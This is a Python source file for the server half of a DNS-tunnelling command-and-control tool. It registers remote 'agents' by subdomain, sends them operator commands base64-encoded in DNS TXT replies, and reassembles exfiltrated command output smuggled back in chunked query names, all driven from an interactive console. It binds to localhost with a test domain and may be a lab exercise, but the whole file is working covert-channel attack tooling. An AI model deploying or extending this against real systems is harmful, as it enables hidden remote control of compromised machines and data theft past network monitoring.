import socket
import threading
import base64
import time
import struct

class Server:
	def __init__(self, service_ip, port, domain):
		self.service_ip = service_ip
		self.port = port
		self.domain = domain
		self.clients = {} 
		self.cmd_list = {}
		self.cmd_output = {}
		self.output_store = {}  

		
	def start(self):
		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			self.sock.bind((self.service_ip, self.port))
			print(f"[+] DNS Server listening on {self.service_ip}:{self.port}")
			print(f"[+] Waiting for clients to connect...")
		   
 
			while True:
				data, addr = self.sock.recvfrom(1024)
				client_ip = addr[0]
				client_port = addr[1]
				query_info = self.parse_query(data)
				qname = query_info['qname']
						
				if self.domain in qname:
					response_data = self.prepare_response(query_info, client_ip, client_port, qname)
					if response_data:
						self.sock.sendto(response_data, (client_ip, client_port))
				else:	
					response_data = self.generate_response(query_info)
					if response_data:
						self.sock.sendto(response_data, (client_ip, client_port))
		except socket.timeout:
			print(f"Socket timeout for {qname}")
		except socket.gaierror:
			print(f"Socket get info for {addr}")
		except Exception as error:
			print(f"[-] Server error: {error}")		

	def parse_query(self, data):
		try:
			if len(data) < 12:
				return None
			transaction_id = data[:2]
			flags = b'\x85\x80'  			
			qdcount = data[4:6]
			query_section = data[12:]
			qname_parts = []
			pos = 0
			while pos < len(query_section):
				length = query_section[pos]
				qname_parts.append(query_section[pos+1:pos+1+length])
				pos += length + 1
			
			qname = b'.'.join(qname_parts).decode('utf-8', errors='ignore')
			
			qtype = query_section[pos:pos+2]
			
			return {
				'transaction_id': transaction_id,
				'flags': flags,
				'qdcount': qdcount,
				'qname': qname,
				'qtype': qtype,
				'query_section': query_section[:pos+4]  
			}
		except Exception as error:
			print(f"[-] Error parsing DNS query: {error}")
			return None


	def generate_response(self, query_info, answer_data=None, answer_type='A'):
		try:
			transaction_id = query_info['transaction_id']
			flags = query_info['flags']
			qdcount = query_info['qdcount']
			ancount = b'\x00\x01' if answer_data else b'\x00\x00'  
			nscount = b'\x00\x00'  
			arcount = b'\x00\x00' 
			header = transaction_id + flags + qdcount + ancount + nscount + arcount
			question = query_info['query_section']
			
			answers = b''
			if answer_data:
				name = b'\xc0\x0c'
				record_class = b'\x00\x01'
				ttl = b'\x00\x00\x00\x01'
				if answer_type == 'A':
					record_type = b'\x00\x01'
					rdlength = b'\x00\x04'
					rdata = socket.inet_aton('127.0.0.1')
					answers = name + record_type + record_class + ttl + rdlength + rdata
				elif answer_type == 'TXT':
					record_type = b'\x00\x10'
					answer_data = answer_data.encode('utf-8') 
					answer_data = bytes([len(answer_data)]) + answer_data
					rdlength = struct.pack('>H', len(answer_data))
					answers = name + record_type + record_class + ttl + rdlength + answer_data
			return header + question + answers
			
		except Exception as error:
			print(f"[-] Error creating DNS response: {error}")
			return None

	def prepare_response(self, query_info, client_ip, client_port, qname):
		parts = qname.split('.')
		client_id = parts[0] 		
		if client_id not in self.clients:
			self.clients[client_id] = {
				'ip': client_ip,
				'port': client_port,
				'last_seen': time.time()
			}
			print(f"[+] NEW AGENT REGISTERED: {client_id} from {client_ip}:{client_port}")
			print(f"[+] Available clients: {list(self.clients.keys())}")
		else:
			self.clients[client_id]['last_seen'] = time.time()

		if 'output' in qname:
			if self.process_query(client_id, qname):
				response_data = self.generate_response(query_info, '127.0.0.1', 'A')
				return response_data

		
		if client_id in self.cmd_list and self.cmd_list[client_id]:
			cmd = self.cmd_list[client_id].pop(0)
			encoded_cmd = base64.b64encode(cmd.encode()).decode()
			
			response_data = self.generate_response(query_info, encoded_cmd, 'TXT')
			print(f"[+] Sent cmd to {client_id}: {cmd}")
			return response_data
	
	def process_query(self, client_id, qname):
		try:
			parts = qname.split('.')
			
			if 'chunk' in parts:
				chunk_num = int(parts[3])
				total_chunks = int(parts[4])
				domain_index = parts.index(self.domain.split('.')[0])
				encoded_parts = parts[5:domain_index]
				encoded_chunk = ''.join(encoded_parts)
				
				if client_id not in self.output_store:
					self.output_store[client_id] = {
						'chunks': {},
						'total_chunks': total_chunks,
						'start_time': time.time()
					}
				
				self.output_store[client_id]['chunks'][chunk_num] = encoded_chunk
								
				if len(self.output_store[client_id]['chunks']) == total_chunks:
					full_encoded = ''
					for i in range(total_chunks):
						full_encoded += self.output_store[client_id]['chunks'][i]
					#####
					full_encoded = full_encoded.replace('_', '/').replace('-', '+')
					padding = 4 - (len(full_encoded) % 4)
					if padding != 4:
						full_encoded += '=' * padding
					output = base64.b64decode(full_encoded).decode('utf-8', errors='ignore')

					if output:
						if client_id not in self.cmd_output:
							self.cmd_output[client_id] = []
						self.cmd_output[client_id].append({
							'output': output,
							'timestamp': time.time()
						})
						print(f"\n[+] COMPLETE OUTPUT FROM {client_id}:")
						print(output)
						print("-" * 50)
					
					del self.output_store[client_id]
				
				return True

		except Exception as error:
			print(f"[-] Error processing chunked output: {error}")
		
		return False


	def manage(self):
		print("Guide: use <client_id>, exit")
		
		current_client = None
		
		while True:
			if current_client:
				prompt = f"DNS-CMD ({current_client})> "
			else:
				prompt = "DNS-CMD> "
				
			try:
				cmd = input(prompt).strip()
				
				if cmd == "exit":
					break
				elif cmd.startswith("use "):
					client_id = cmd.split(" ", 1)[1].strip()
					if client_id in self.clients:
						current_client = client_id
						print(f"[+] Using client: {client_id}")
					else:
						print(f"[-] Client '{client_id}' not found!")
						print(f"[-] Available clients: {list(self.clients.keys())}")
						
				elif cmd and current_client:
					client_id = client_id.strip()
					if client_id in self.clients:
						if client_id not in self.cmd_list:
							self.cmd_list[client_id] = []
						self.cmd_list[client_id].append(cmd)
						print(f"[+] Command queued for {client_id}: {cmd}")
					else:
						print(f"[-] Client {client_id} not found!")
						print(f"[-] Available clients: {list(self.clients.keys())}")					
			
				elif not cmd:
					continue
				else:
					print("[-] No client selected. Use 'use <client_id>'")
					
			except KeyboardInterrupt:
				print("\n[!] Type 'exit' to quit")
			except Exception as error:
				print(f"[-] Error: {error}")

if __name__ == "__main__":
	server = Server(service_ip='127.0.0.1', port=9876, domain='testdns.code')
	server_thread = threading.Thread(target=server.start)
	server_thread.daemon = True
	server_thread.start()
	server.manage()
